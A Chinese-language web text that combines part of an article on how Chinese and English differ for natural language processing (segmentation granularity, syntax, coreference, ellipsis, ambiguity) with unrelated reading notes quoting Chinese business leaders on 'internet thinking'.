The algorithms and programs,which used on the website, are owned by the company called DataGrand, and are well known in China.
这里出现的标点和大小写字体是良好的句子语义指示符，既分割不同句子，也在句子内部分割不同语义，这些规范给英文NLP处理创造了较好的环境。
中文标点的使用则没有这么强的规范。事实上中文标点在中国古代官方文书中一直不被采用，仅扮演民间阅读中的停顿辅助符的角色。直到1919年中华民国教育部在借鉴了西方各国标点规范后才第一次制定了汉语的12中符号和使用方法，建国后在1951年和1990年两次修订后逐步成型。因为历史沿革的原因，这些对标点的使用规范更多偏向于指导意见，而不是一套强制标准。
例如对逗号和句号何时使用，并不像英语中有特别严格的界定。汉语的分句较为模糊，意思表达完以后虽通常用句号，但用逗号继续承接后面的句子也并不算错，只要整篇文章不是极端的“一逗到底”，即使语文老师在批阅作文时也都不会过分对标点较真，而日常文章中标点的使用更是随心所欲了。
与此同时，英文里专有名词用大写或者斜体字体来区分，首字母大写等用法，在中文中也不存在。NLP处理中，中文标点和字体使用的相对随意给句法分析也带来了巨大的挑战，尤其在句子级别的计算机语义理解方面中文比英文要困难很多。
除了上述不利因素，中文也有一些独特的标点带来有利的因素。例如书名号《》就是中文所独有的符号，感谢这个符号！书名号能非常方便的让计算机程序来自动识别专有名词（如书名、电影名、电视剧、表演节目名等），这些名词往往都是未登录词，如果没有书名号的指引，让计算机程序自动识别这些中文专名的难度将加大很多，而这些专名词汇恰恰都体现了文章的关键语义。
例如下面这段新闻如果让计算机来阅读：“由于流浪地球的内容很接近好莱坞大片，因此影评人比较后认为不仅达到了2012的水平，而且对比星际穿越也毫不逊色。”要求计算机自动提取上面这句话的关键词会非常困难，因为里面有很多未登录词，对“2012”的理解也会有歧义（时间词？or电影名？）
而正因为我们中文有书名号，迎刃而解：“由于《流浪地球》的内容很接近好莱坞大片，因此影评人比较后认为不仅达到了《2012》的水平，而且对比《星际穿越》也毫不逊色。”。除了书名号，汉语的顿号（、）也能很好的指示并列关系的内容，“达观每天下午的水果餐很丰富，有桃子、葡萄、西瓜和梨”，这些并列的内容可以很方便的被计算机解读。
英文则没有书名号和顿号等，而是采用特殊字体（例如加粗、斜体、大写，各不相同，没有强制约定）等形式来标识出这些专有名词。因此在处理英文时，这些字体信息起很重要的作用，一旦丢失会带来麻烦。
值得一提的是，在日常聊天文字中，标点符号和字母使用的含义产生了很多新的变化。例如对话文本中“。。。。。”往往表达出“无语”的情绪。“？”和“？？？”前者是疑问，后者更多表达震惊。还有 ?  ^o^/  ORZ等各类的符号的变换使用，给开发对话机器人的工程师们带来了很多新的挑战。

五、词汇粒度的处理方法差异
词汇粒度问题虽然在NLP学界被讨论的不多，但的的确确NLP实战应用中的一个关键要点，尤其在搜索引擎进行结果召回和排序时，词汇粒度在其中扮演关键角色，如果对其处理不恰当，很容易导致搜索质量低下的问题。
我们先看中文，词汇粒度和分词机制有很大关系，先看个例子：“中华人民共和国”这样一个词，按不同粒度来切，既可大粒度切为：“中华人民，人民共和国”，也可进一步切出“中华，人民，共和国”，而“共和国”还可以进一步切为“共和，国”。一般我们把按最小粒度切分所得的词称为“基本粒度词”。在这个例子中，基本粒度词为“中华，人民，共和，国”4个词。甚至“中华”还能继续切出“中/华”也有表义能力（这个后面还会详细分析）。
为什么分词需要有不同的粒度呢？因为各有作用。大粒度词的表义能力更强，例如“中华人民共和国”这样的大粒度词，能完整准确的表达一个概念，适合作为文章关键词或标签提取出来。在搜索引擎中直接用大粒度词去构建倒排索引并搜索，一般可得到相关性（准确率）更好的结果。
但从事过信息检索的朋友们想必清楚召回率（Recall）和准确率（Precision）永远是天平两端互相牵制的两个因素。大粒度词在搜索时会带来召回不足的问题。例如一篇写有“人民共和国在中华大地上诞生了起来”的文章，如果用“中华人民共和国”这个词去倒排索引中搜索，是无法匹配召回的，但拆分为“中华人民 共和国”三个词进行搜索就能找出来。
所以一个成熟的分词器，需要因地制宜的设置不同粒度的分词策略，并且最好还能确保在检索词处理（Query Analysis）和索引构建（Index Building）两端的切分策略保持一致（陈运文）。目前学术界公开的分词测试集合，往往都是只有一种粒度，而且粒度划分标准也并不一致，导致很多评测结果的高低离实际使用效果好坏有一定距离。
在中文分词粒度里，有一个非常令人头疼的问题是“基本粒度词”是否可继续拆分的问题。就好比在化学中，通常约定原子（atom）是不可再分的基本微粒，由原子来构成各类化学物质。但如果进一步考虑原子可分，那么整个化学的根基就会动摇。同样在中文NLP领域，虽然学术界通常都默认基本粒度词不再可分，但在实际工程界，基本词不可再分会导致很多召回不足的问题，引入难以解决的bad case。不要小看这个问题，这是目前限制中文语义理解的一个特别常见的难题。要解释清楚来龙去脉，笔者还得从汉语的发展历程说起。
中国古代汉语的表义基本单位是字而不是词。我从《论语》中拿一句话来举例：“己所不欲，勿施于人”。古代汉语一字一词，这句话拿来分词的话结果应该是“己/所/不/欲，勿/施/于/人”，可见全部切散为单字了。如果用现代白话文把这句话翻译过来，则意思是“自己都不愿意的方式，不要拿来对待别人”。现代汉语的特点是一般喜欢把单字都双音节化，“己–>自己，欲–>愿意，勿–>不要，施–>对待，人–>别人”。
可以看出这些双音节（或多音节）词汇中部分蕴含着来源单字的意义。这种现象在现代汉语词汇中比比皆是，例如“狮子”，“老虎”，“花儿”，“图钉”，“水果”，“红色”等，对应“狮，虎，花，钉，果，红”等有意义的单字。而如果把这些双音节词作为不可再切分的基本粒度词的话，当用户搜“狮”的时候，即使文章中出现了词汇“狮子”，也是无法被搜到的。
那么如果将这些基本粒度词再进一步切分呢？会切出“子，老，儿，图，水，色”这样存在转义风险的词汇（即这些单字对应的含义并未体现在原文中），带来很多“副作用”。例如用户搜“老”的时候，当然不希望把介绍“老虎”的文章给找出来。
与此同时，还有另一类的情况是有一些词汇切为单字后，两个单字都分别有表义能力，如“北欧”切为“北/欧”，对应“北部，欧洲”两方面的意思。“俄语”切为“俄/语”，对应“俄国，语言”，“苦笑”，切为“苦/笑”，对应“痛苦，笑容”，以及“海洋”，“图书”，“亲友”，“时空”等都是可细分的。
还有第三类情况是，词汇切分后单字都不能体现原词含义，例如“自然”，如果切分为“自/然”，两个字都没有意义。类似的还有“萝卜”，“点心”，“巧克力”等，外来语为多。
之所以前面提到如今中文语义分析时，基本粒度问题是一个关键难题，原因是在现代汉语写作时，既有现代双音节/多音节词汇，也夹杂很多源于古代汉语的单字，半文半白的现象很常见，这就一下给语义理解带来很大的挑战。不管是切分粒度的选择，还是单字和词汇间关联关系的提取，标题和正文语义的匹配，当面临文白间杂时都会遇到难关。
常见的情况为：新闻标题为了精炼，经常喜欢采用源自古汉语习惯的单字简称或缩略语。例如“中美援非模式差异带来效果大相径庭”，是选择“中美/援非”这样的基本切分粒度，还是按单字表义切分为“中/美/援/非”，对应“中国美国援助非洲”这样的内容，是存在各自的利弊的。计算机提取文章关键词时，还需要把“援—>援助，非–>非洲”还原为词并建立关联才能很好的解读处理。
目前业界并没有一个公认的粒度标准，常见的几个评测语料集合，如北大pku-test，微软亚洲研究院msr-test，人民日报标注语料等，切分标准都有所不同。虽然一般普遍采用的双音节词为主的基本粒度标准，但是在应用于搜索引擎、问答对话时都会出现大量召回不足的问题。而大量采用单字作为基本粒度词又会引入有转义风险的无效单字，并且还会出现运算性能等隐患。
为了解决基本粒度词的问题，笔者曾在百度设计开发了亚粒度词（subterm）补足的策略，缓解了召回不足的问题，工业界还有一些其他的同义词关联等方法来应对，但到目前为止词汇粒度问题仍然是困扰中文NLP的一个“慢性病”。近年来兴起的BERT模型，利用大量文本进行Transform预训练，填补各种粒度词汇的语义信息，也是是一种缓解问题的办法。
英文因为不存在切分问题，所以粒度问题只需要考虑词组（Phrase）切分的问题。例如Harvard University，两个单词可以切为Phrase来表达一个具体机构。相比中文的从细到粗的多粒度切分要简单很多。

六、句法结构分析方法异同
自然语言处理在词汇级别之上是语句级别，因为语句是由一系列的词汇排列组合后生成的。通过学习语法我们知道句子结构是由“主谓宾定状补”这样的句法元素构成的。例句“陈运文去达观数据上班，”主语是“陈运文”，谓语“上班”，“达观数据”是状语，说明动作发生的地点。
在句子结构方面，“英语重形合，汉语重义合”的特点体现的非常明显。英语为了充分体现句子中的各种承接、转折、从属、并列等关系，不厌其烦的准备了大量的连词、助词、介词、冠词等作为填充剂，来补充实词之间的缝隙，构成了很多从句、引导句。这些包含各类结构的结构，让计算机来进行语义角色标注(SemanticRole Labeling, SRL)和语义依存分析(SemanticDependency Parsing, SDP)相对比较容易。
因为这些形式指示词的存在，一个大家能很直观发现的现象就是英文写出来的句子往往都特别长，整篇文章篇幅多。而同样的意思用中文写出来，篇幅往往只需要英文的一半甚至更少，汉语的句子非常精炼，尤其诗歌用短短几个字能描述出丰富的内涵——“孤帆远影碧空尽，唯见长江天际流”，多么洗练优美有意境。
从计算机的视角来看，恰恰因为汉语讲究意合而不重形式，句子结构都比较松散，并没有英文中那么多的虚词作为实词间的语义粘合剂，而是依赖词汇前后顺序关系，隐含表达出句子结构，所以也给计算机处理带来了挑战。例如“中国人工智能创业企业获奖名单公布”这句话里，“中国，人工智能，创业，企业，获奖”这一连串的名词均是主语“名单”的定语，如果用英语来写这句话，一定会出现形如“the…of…that…which…”这样一系列的辅助词来把这些名词粘接到一起，而中文并没有它们。所以当我们训练算法去识别句子主语和定语的时候，必须要小心的判断哪个名词才是句子的真正主语所在。汉语中句子的重心往往后移，相反英语中句子主要部分前移，所以通常生成句法依存树时中文都会自动选择靠后的名词。

除了句子内部的辅助词外，在句子间关系识别时，中英文都会通过特定标识词连接子句间关系，例如转折关系（虽然…但是…），假设关系（如果….就…），递进关系（不仅…而且…），因果关系（因为….所以….），英文则是because…, Although…, If…, but also… 等。在中英文中这些标识词经常会被自动省略，例如“车站人流量大，大家要照看好自己的行李”。这里隐含的语义为“[因为]车站人流量大，[所以]大家要照看好自己的行李”，[-]内的词汇被自动省略了。区别在于英文一般会省略其中一个，例如“because…, so…，”这样的句子会省掉其中一个，中文则既可以全省掉，也可以全写出，实际进行语义理解时需要额外补充处理。
目前句法依存分析在实际工程应用中并没有发挥很大作用，其原因一方面是上述一些现象导致了很难抽取得到特别准确的句法关系结果，另一方面是大部分NLP应用选择了直接从词汇或篇章级别来获得结果，省去了中间句子这层。目前业界针对长程的语义上下文关系，逐步放弃传统的RST方法，更多倾向于利用记忆网络（如bi-LSTM）等技术完成提炼。在聊天对话等应用方面，用句法结构来把握语义仍然是会有价值的。

七、中文英文指代消解处理
计算机进行文章内容解读时，经常碰到指代消解（ReferenceResolution）的问题。不论是在书面文本中进行长文章解读，还是在对话文本中回溯前文问题，指代消解都起到非常关键的作用。计算机需要能像人类一样建立起上下文间这些词汇间的关联关系，做到把概念串联起来“读懂”文章的意思。例如这句话：
“达观数据顺利入驻浦东软件园，公司创始人陈运文表示，达观专注于为企业提供文本智能处理软件系统和技术服务。他说：‘文本理解任重道远’”
这句话里“公司”、“达观”、“他”这些都是指代词，“达观数据”、“陈运文”是真正的实体，称为先行语（antecedent），而“公司”、“达观”、“他”是回指语（或称为照应语，anaphor）。回指语有时是代词（如“He”、“that”、“该公司”、“上述条款”、“前者”、“被告人”等等），有时是简称或缩写（如“达观”、“CEO”、“NLP”、“WTO”），有时采用借代方法，如“白宫的态度非常坚决”，“范冰冰们的纳税情况逐步被公布”，“白宫”=“美国总统”，“范冰冰们”=“大陆影视演员”。
人类的阅读能力非常强，各类指代的情况人都能通畅理解，但对计算机来说并不简单。在NLP领域为此专门存在技术分支称为指代消解。指代消解通常又细分为回指、预指、共指等情形，实践中通常称为共指消解（CoreferenceResolution）。

英文中常见指代语是专名首字母缩写，也是表音文字特别之处。英文中专有名词往往由多个单词构成，篇幅长，从中抽取字母构成各类缩写约定非常常见。缩写一部分是行业内通用的（例如计算机领域常见的CV，DNS，CPU，NLP等），另一些则是在文中第一次出现专名时临时约定的。
例如一篇行业分析报告里的句子：“High Carbon Steel (HCS) is typically producedas low carbon steel. HCS export volume in YTD 2017 reached to 6.9 millionmetric tons(MMT).”。这里临时性缩写（HCS，YTD，MMT等）大量出现。这些回指语是一个新的独立单词（例如例子中的HCS），和原词汇的关联处理通过共指消解来完成。另一类回指语是“it、which、where、there、that”等这样的指代词，要通过上下文依赖关系去寻找实体。
中文的缩写通常是从实体中抽取若干汉字新构成的词，例如北京大学简称北大，复旦大学简称复旦，XX银行，通常简写为X行，XX局长，简写为X局。（陈运文）因为汉字里单字的表义能力比英文中单独的字母要强的多。我们知道常用汉字有5000多个，而英文字母只有26个，所以中文缩写词更容易能让人“望文生义”，读懂含义。例如“高碳钢”这个缩写即使是外行也能猜出意思，但是HCS怕是很难直接让人明白是啥，即汉语在缩略语的可读性上优于英文。
正因为英文缩略语可读性弱，且重复歧义多，所以为了让人能读懂，英文里通常都会清楚标出先行语和缩写规则。而汉语里除非严格的法律文书会前置术语表，一般文本里用缩略语时比较随意，很多时候约定俗成，并不“提前打招呼”。例如新闻：“北大学生在刚刚结束的奥数竞赛中成功摘得两枚金牌”。如果按缩略语习惯，应该写为：“北京大学（以下简称北大）学生在刚刚结束的国际奥林匹克数学邀请赛（以下简称奥数）中成功摘得两枚金牌。”
在共指消解中还会遇到的一类问题是因为语法结构导致的指向歧义的问题。例如“这张照片里有陈运文和高翔的同事”、“那边坐着三个公司的工程师”，这在前面句法结构解析时提到过，也同样会影响中英文在处理共指消解时的结果。
在实际工程应用中，共指消解最常用到的场景是对人名、机构名、地点、条款、具体事件、关系类型等要素的指代处理。在超长文书（如证券行业的上市公司重组公告、招股说明书等）处理方面该技术也起了很大作用。日常中文的共指消解存在一定的行文规律，通过预先挖掘简写和指代词表导入算法中可显著提升效果。业界常见的共指消解方法既有传统的规则启发法，也有经典的统计学习、聚类算法、概率图模型等，此外深度强化学习、长短时记忆网络等新的Meural Mention-ranking方法也有良好的效果。

八、英汉语词汇间关联关系挖掘
词汇间关系是构建语义网络的一项基础技术，我们知道同义词、近义词、相关词是特别常见的词汇关系，此外词汇的上下位（例如在生物知识网络中Sparrow属于Bird，Shanghai属于China）和词向量等在NLP处理中都很重要。和英文单词相比，汉字的数量少得多，常用汉字数才2000-3000个，其中最常用的1000个汉字已经能覆盖92%的书面资料了。这1000个汉字中去掉偏旁部首类似的字，独立语素更是不到500个。在表述事物时汉语中采用字组合的方式，可以非常方便的理解词义并且研读出词汇之间的关联关系。
而英文单词动辄2万-3万个（美国成年人平均单词量），而且意思相似的词汇间的字母构成差异很大，所以很多情况下如果没见过某个单词，很难像中文一样大致能猜出词汇所指的意思。请大家不查词典猜猜limousine、roadster、saloon分别是什么意思，再看看对应的中文意思，就能理解为什么会有这么多英文单词了。
我们再用下面的这样一些例子给大家直观的展示英文在表述相近事物时的差异性：Chick, Rooster, Hen, Egg彼此之间从字母分布上来看很难看出有什么关联，但是换成中文，对应的是小鸡、公鸡、母鸡、鸡蛋，很容易就能发现其中的规律。中文词汇是由有意思的单字组合构成的，因此通过字就很容易观察和理解词汇间的关系。
类似的，小牛，公牛，母牛的英文单词为Calf，Ox，Cow，甚至公牛在英文中还区分阉割后的steer和没被阉割的bull。因此汉语NLP中只需要根据动物名“鸡”、“牛”、“猪”、“鸭”加上相应的形容词就可以知道意思了，而在英文中由于单词的差异无法直接通过单词的语素关系直接计算获得，所以为验证语义关系时略为复杂一些。

知识图谱（Knowledge Graph）是理解这些词汇间关系一种好办法。词汇（或称为实体Entity）间的关系通过挖掘大量文本、Wiki等来构建。英文词汇间的关系不像中文这样能让人能观察到，因此构建知识图谱对英文来说非常有价值。例如spaghetti，penne，capellini，fusilli，lasagne，macaroni这些实体，通过构建出知识图谱，才能让计算机知道他们都属于Pasta（意大利面）下面的某个品类的名字。
近几年兴起的基于Skip-gram或CBOW模型的Word2Vec方法一经提出就得到了非常广泛的应用，在实践中好评如潮，就是因为embedding技术恰好弥补了英文中词汇之间关系不直观的问题，对提高计算机英文语义理解的能力起到了很好的帮助作用。类似的，中文词向量、预训练等技术构建好后，也带来了整体语义分析效果的大幅度进步。汉语和英语在词汇间关系挖掘这个方面，目前整体的算法都是相同的，区别在于汉语的词汇间关系可以更加显式的被人观察到。
毕竟，让人来判断hepatitis和pneumonia，Grape和Raisin，January和March，Monday和Thursday间的关系，相比分析肝炎和肺炎，葡萄和葡萄干，一月和三月，周一和周三之间的关系，还是要困难很多的，对计算机来说也是如此。

九、中英文省略和内容补足的处理
语境是一个微妙的概念，人类在进行文字阅读时，不只是看到文字内容本身，而是不自觉的会将语境相关的词汇自动补充进入字里行间，辅助语义理解。反之，人类在文字写作时，会将一些重复内容省略掉，主语或宾语是最常被省略的对象。例如摘录自合同文书的一段文字“本协议中约定了大桥建设工程的具体内容，其中乙方负责承接，丙方负责监督，以确保顺利交付”。
如果让计算机来解读，需要把指代语补齐（用[-]表示）为：“本协议中约定了大桥建设工程的具体内容，乙方负责承接[该工程]，丙方负责监督[乙方的工作]，确保[该工程]顺利交付”。 书面文本还相对规范，如果是日常对话的口语文本，那么省略更加是无处不在，以一个电商客服问答为例：“这双卖多少？”，“58”。“少点？”，“最低了”。“行吗？”，“做不了哎”。如果补齐省略语，应该为：“这双[鞋子的价钱]卖多少？”“[价钱]少点[行吗]？”“[价钱少点]行吗？”
除了主谓语省略，一些非常重要的连词也经常被省略，例如“因为…所以…，虽然…但是…，尽管…然而…”，例如：“开车不注意，亲人泪两行”，“股市有风险，投资需谨慎”，补充逻辑连词后为“[如果]开车不注意，[那么]亲人泪两行”，“[因为]股市有风险，[所以]投资需谨慎”。
英文的省略习惯也存在（全世界人民都爱偷懒），例如省略主语it：“Looks as if it will snow”，省略谓语comes：“Who next?”，省略宾语thedishes:“Let ’ s do the dishes. I ’ ll wash and you ’ ll dry.”,省略连词that“It ’ s a pity[that] she ’ s leaving”。当然英文中还有一类约定俗成的独特简称（很多来自拉丁语）e.g., etc., al., i.e., viz.等。
区别在于英文书面文本中省略出现的较少，同时语义连接词的省略有固定规范，例如“because…so…”要求只省其中一个。英文行文时单词使用量比中文多，同样的内容英文篇幅通常是中文的200%左右，也即中文1页纸写完的内容，如果用英文写要2页甚至更多。如果对比惜字如金的文言文，就更浓缩了。如“民为贵，社稷次之，君为轻”，10个字如果改用英文写，没有几十个单词怕是说不清楚。那么放到省略环境下看时，汉语就比较吃亏了，因为本来就浓缩，再加上语法约束不严导致时不时省略，对信息的损失比较大。
从10个汉字的短句中省略2个字，和从一段20个单词的英文句子中省略2个单词，前者对计算机处理来说要费力不少。达观在进行文本应用实践中，也在想办法主动“脑补”出这些省略语，加深对文字理解的深度（陈运文）。近年兴起的文本预训练（例如大名鼎鼎的BERT，MT-DNN等）技术通过海量文本的预训练，对文本进行表示学习，运用transform编码器等把这些词句中的隐语义信息嵌入（Embedding），结合Attention机制，填补省略内容，在自然语言理解（NLU）的很多应用（例如GLUE benchmark、斯坦福阅读推理SQuAD、SNLI、MultiNLI、SciTail）能大幅度提升效果。

十、歧义问题与子串转义处理
虽然大部分NLP的算法都具备语言无关性（Language independent），但是在具体工程任务中还是有很多语言相关的问题。在汉语中经常发生的一类情况是文字子串局部转义的问题。这个问题因为是汉语所独有的，在英文中几乎不曾出现，所以在自然语言处理的学术界并不作为主流的课题被研究（因为学术界主流还是倾向于研究语言无关性的课题和方法）。但是笔者在多年从事NLP以及搜索和推荐系统技术研发工作时，深深的感受到子串转义是一个非常困难却也非常重要的汉语NLP课题。对这个课题处理水平的高低直接影响着大量的实际工程效果。下面具体阐述下该问题的定义。
前文我曾提到过汉语中单字不多（3000个汉字可以覆盖99%的中文文本了），所以汉语里的词汇大多是由几个汉字顺序组合来形成的。这里潜伏着一个巨大的隐患是，因为字的排列组合形式很多，所以会导致局部出现的一些组合所构成的意思，和整体词的意思不同，出现歧义；或者说一个词汇中的子串和整个词的意思会出现很大的差异，因而也称为子串转义问题。
这里我用数学形式化的方法再来表述下：假设A、B、C分别表示三个汉字，那么子串转义就是指词汇ABC的含义，和AB或者BC的含义完全不相同。当然4个汉字或者更长的短串也类似。例如ABCD和ABC或BCD或AB、BC、CD的意思可能会完全不同，这种意思“突变”的情况称为子串转义。
例如：“周杰伦”和其中的前两个字构成的词“周杰”显然指的是完全不同的两个人，“荨麻疹”和“麻疹”是两种病，“亚健康”和“健康”的意思截然相反。这会给计算机处理带来很多困难，尤其在搜索引擎中，当用户搜“周杰”或“麻疹”或“健康”时，如果结果出“周杰伦上海粉丝见面会”、或“荨麻疹治疗方法”、“导致白领亚健康的主要原因”都是不太好的结果。我们在搜索引擎中遇到的大量结果不相关的问题，很多都是由于汉语中局部转义现象导致的。
同样，在进行关键词提取、文本相似度计算、相关文章推荐等场景的时候，这些局部转义的问题同样也会带来很大麻烦。例如“周杰伦上海粉丝见面会”和“周杰伦现身上海电影节”两篇文章的内容相关度，显然远大于“周杰上海粉丝见面会”。
很多朋友可能会觉得这些都可以视为命名实体识别（NER）问题，将这些专名直接切为一个整体，就能解决上述局部转义的问题了。其实没这么简单，因为其实大量的中文词汇里，局部词组合成的意思和整体词汇是存在关联的，如果不切开会带来召回不足的问题。例如“消防队”和“消防”，“上班族”和“上班”，“315晚会”和“315”等，甚至前面例子里“周杰伦”和“杰伦”也有紧密的语义关联。当用户搜索词是“消防”、“杰伦”、“315”等query时，相应的整体词“周杰伦”、“315晚会”等所在的文章也理应被搜出来。因为明明文章里有这个词且意思相关，如果没被找出来是不能被用户接受的。通过这些例子可见正确处理汉语的字词组合的确是一件很棘手的课题。
再举个例子：“不可以”这个常用词，把“不可”单独作为子串提取出来是非常有必要的，因为和原词意思相同。但是把“可以”单独提取出来就很危险，因为和原词意思相反，单独进行搜索匹配会导致歧义。再如我们可以把“阿里巴巴”里的子串“阿里”切出来，因为很多时候用户称呼“阿里”就是指“阿里巴巴”，但是把“里巴”或“巴巴”切出来则是不合适的。
究竟哪些子串词汇和原词意思相同相近？哪些又会发生转义？这需要计算机更智能的进行判断才行，目前我们已经想了一些方法去解决，例如通过字的共现频率等进行处理，但离彻底解决汉语里子串转义的问题还有距离。
除了子串转义外，汉语中其他歧义的情况也是比比皆是，例如“我去上课了”、“她看病去了”（主动和被动不明，导致无法区分老师还是学生，病人还是医生）、“要多少有多少”（无法区分核心语义是多还是少）、“咬死了猎人的狗”、“喜欢山区的孩子”（无法区分狗或孩子是主语还是宾语）。因为中文不是靠词汇的变形变换来体现修饰、主被动等关系，而是靠顺序组合来体现，因此在中文NLP的各个环节，从分词、词性、句法、指代，到局部子串处理等，都会带来歧义理解的问题。
英文中也存在歧义问题，最常见的情况是英文多义词导致的。例如“He went to the bank”既可以理解为“他去了银行”，也可以理解为“他去了河岸边”，“The doctor saw the Indian dance”，单词Indian既可以视为形容词“印第安人的舞蹈”，也可以是名词“印第安人+跳舞”，还有英文中不定式导致的歧义，如“Not many books filled the shelves”，可以理解为“书架上没有几本书”或者“要放满那些书架不用很多书”。
其实所有的人类语言都存在着各式各样的歧义的问题，我们看到各个民族所流传的笑话里很多都是拿这些歧义语义来打趣的。不同语言处理歧义的具体方法不同，但整体思路都是将歧义句放到句子上下文里来解读，引入更多语境信息来正确获得意思。
可以说计算机进行语义理解的结果，某种程度上就是在和各种各样的歧义做斗争的过程。打个比方，自然语言处理的过程就像是让计算机拿着用上下文语境拼凑出的一张残缺的地图，拨开云遮雾绕的文字迷雾，越过歧义所埋下的一个个大坑，逐步接近语义真相的过程。

中英文NLP差异总结
中文和英文这两类全球使用人数最多，影响力最大的语言，有各自鲜明的语言特色，在计算机进行自然语言处理领域也有各自独树一帜的地方。本文从语言特点的角度出发，从10个方面分析了中英文在自然语言处理上的差异。随着全球化的发展，中英文在不断相互影响，相互渗透。例如中文中有大量的外来语来自英文，沙发、咖啡、巧克力、牛顿等这些频繁出现的词汇都源于英文，还有很多专业术语如NGO、WTO、CFO等，甚至NLP一词本身也是源自英文。英文也在受中文影响，每年都有近千条外来词汇新收录入英文词典，如Kungfu（功夫），tofu（豆腐）等。










虽然书中很多内容，在IT 老司机来看都是老生常谈，但对于我们每个有互联网思维的小伙伴来说还是常读常新的。
很多我摘抄的内容，没有上下文语境不是很好理解，推荐花5个小时左右时间把书读一遍，算是温习一遍互联网思维。


第1章 前 言
雷军以简单的7 个字表达他对互联网思维的理解：“专注、极致、口碑、快”；
周鸿祎认为，互联网思维的关键词有四个，
一是用户至上，
二是体验为王，
三是免费，
四是跨界。
而在张瑞敏看来，“互联网思维”包含两层含义：
一是并行生产，即消费者、品牌商、渠道、上游供应商利用互联网技术全流程参与；
二是经营用户而非经营产品，传统制造业以产品为中心，而未来的制造业以用户为中心。
第2章 用户思维
华为的高层领导们20多年来变着法子、换着花样不断重复一个老掉牙的真理—— 以客户为中心。华为一位顾问，曾经写过一篇文章叫《客户是华为存在的理由》，任正非在改这篇稿子的时候加了两个字—— 《客户是华为存在的唯一理由》。
今天所有的营销驱动不是你在新浪花多少钱，而是你能够占领用户多少时间，是你内容本身的运作能力。做内容营销，我认为最核心的是创造话题，包括要有一些配套活动的策划。
我们正要进入并快速拥抱每个消费者的时代，人人都是设计师，人人都是创意师，人人都是裁缝，人人都是销售，人人都是消费者。他们越来越追求个性化，越来越追求自己的消费自己作主，这是一个新的改变。

第5章 服务思维
在2010年的一次会议上，任正非进一步指出：在华为，坚决提拔那些眼睛盯着客户，屁股对着老板的员工；坚决淘汰那些眼睛盯着老板，屁股对着客户的干部。
华为四大战略内容中，第一条就是：“为客户服务是华为存在的唯一理由；客户需求是华为发展的原动力。”
百年西方管理学的核心思想，绕来绕去还是离不开一个根本：如何围绕消费者的需求，为公司定位，为管理者定位，为公司的产品定位。
第6章 爆点思维
优衣库的所有发展策略都集中指向一点：从非标准化的服装行业里面挖掘出标准化的品类，借助全球供应链，利用品牌号召力和研发投入降低产品开发失败的风险，将效率发挥到极致，从而也把价格降低到极致。
雷军还坚持认为，在今天浮躁的移动互联网世界里，如果你想做成点事，最好静悄悄地低调去做，做出超出用户预期的东西。如果你做了很多广告吹嘘产品，把用户的胃口吊得很高，而实际产品达不到预期，最后用户一定会很失望的。

第7章 社交化思维
黄太吉CEO赫畅认为，今天在互联网营销的时代就是创建共振，因为每个人都是独立的个体，一个品牌也是独特的个体，如何建立相同的价值观、相同的兴趣取向，相同的社群，才是最关键的。
第8章 产品经理思维
那些风云企业的CEO们，哪个不是在亲自抓产品。
乔布斯从创办苹果之始，就在亲自抓产品，亲自举办产品发布会。谷歌的创始人一直在研发最新产品的“×实验室”工作。比尔·盖茨是编程起家的，辞掉CEO后，还在兼任CTO。中国的IT精英们，多数是搞技术出身，关注点也在产品，这些企业的崛起，不是营销的成功，而是产品的成功。
如果一个人把自己看得太小，只把自己看成一个打工的，如果你是这样的层次和胸怀，你不可能成为一个真正能做好产品的产品经理，所以我希望各位听了我的心得，回去在公司上班的时候，也不用管公司是不是你自己的，你拿出一点儿创业精神。
做产品经理，首先要研究产品，了解市场，并能准确把握市场需求和用户的心理，这样才能宏观掌控一个产品。在这个过程中，产品经理的工作由于要横跨开发、测试、运营、市场等多个环节，因此产品经理的沟通能力就显得至关重要。傅盛甚至认为，在产品设计工作中，80%的问题都是沟通问题。 关注细节问题也是一名优秀的产品经理必备的能力。

第9章 极致思维
要理解极致思维，不妨从两位企业家的座右铭开始。一句是乔布斯的：Stay Hungry，Stay Foolish. 直译是保持饥饿，保持愚蠢，但中国的企业家田溯宁将这一句式翻译成国人耳熟能详的“求知若渴，处事若愚”。另一句是雷军推崇的：“做到极致就是把自己逼疯，把别人逼死！” 产品的核心能力要做到极致
第10章 痛点思维
乔布斯所言：“我们的任务是读懂还没落到纸面上的东西。” 实际上就是对客户隐性需求的深度挖掘，就是客户需求分析。

第11章 简约思维
专注：少即是多 练书法其实只要写好一个“永”字就够了，就能把所有汉字都写得很好看。“永字八法”，一个“永”字就涵盖了所有汉字的笔法精意，这不就是‘大道至简’吗？ 大道至简，少就是多。只有足够专注，才能将一件事情做到极致。
第12章 微创新思维
360董事长周鸿祎这样诠释微创新：“从用户体验的角度，不断地去做各种微小的改进。可能微小的改进一夜之间没有效果，但是你坚持做，每天都改善1%，甚至0.1%，一个季度下来，改善就很大。”

第13章 迭代思维
在飞速发展的互联网行业里，产品是以用户为导向在随时演进的。因此，在推出一个产品之后要迅速收集用户需求进行产品的迭代， 在演进的过程中注入用户需求的基因，完成快速的升级换代裂变成长，才能让你的用户体验保持在最高水平。不要闭门造车以图一步到位，否则你的研发速度永远也赶不上需求的变化。
百度的工程师已经习惯了一个叫“AB test”的开发模式，即如果我们不确定A、B两种结果哪一个更符合用户的需求，就让用户来为我们test，得到结论后迅速调整。
“天下武功，唯快不破。互联网创业，速度一定要跟上去。” “要死也要死得快，早死早超生！” 这是雷军做投资那几年常说的话。 在雷军看来，“快”就是互联网创业的利器。一旦速度跟不上，就会面临一系列解决不完的问题。

第14章 颠覆式创新思维
周鸿祎说：打败微信的不可能是另一个微信。无论是来往还是易信，在核心功能上都与微信基本相似，均采用相同的移动社交产品架构，以“智能通讯录”为核心获取好友，实现语音、文字的即时通讯。既然现有的产品已经完全能够满足使用，那么对于用户来讲，来往就没有存在的必要性了。
第16章 免费思维
硬件免费，服务收费 雷军得出一个结论：在互联网时代，唯一不会被打败的生意，就是胆敢做不赚钱的生意。 于是，他从一开始就不指望小米能在三五年之内盈利。

第18章 跨界思维
……由于跨界思维，未来真正会消失的是互联网企业，因为所有的企业都是互联网企业了。 最大的机遇来源于跨界融合
2013年11月6日，国内首家互联网保险公司—— 众安保险正式开业。 这家公司从筹备之初就备受关注，不仅是因为国内首家互联网保险公司，更因为其背后的股东光环：小微金融服务集团、腾讯、平安参股为前三大股东，业界戏称为马云、马化腾、马明哲“三马卖保险”。
第19章 整合思维
众包：让用户制造产品 《连线》杂志记者杰夫·豪威（Jeff Howe）提出，他认为，众包（Crowdsourcing）就是“把内部员工或外部承包商所做的工作外包给一个大型的没有清晰界限的社会群体去完成”。

